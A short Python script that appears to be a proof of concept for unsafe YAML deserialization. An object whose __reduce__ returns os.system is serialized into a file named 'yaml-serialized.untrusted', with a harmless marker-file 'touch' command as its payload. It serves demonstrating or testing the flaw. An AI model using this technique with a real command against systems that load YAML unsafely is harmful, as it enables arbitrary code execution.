import pickle
import os
import yaml

class Exploit(object):
    def __reduce__(object):
        command = 'touch YAML-EXPLOIT-EXECUTED'
        return(os.system, (command,))


print(Exploit())
serialized = yaml.dump(Exploit())
filename = 'yaml-serialized.untrusted'

with open(filename, 'w') as file_object:
    file_object.write(serialized)

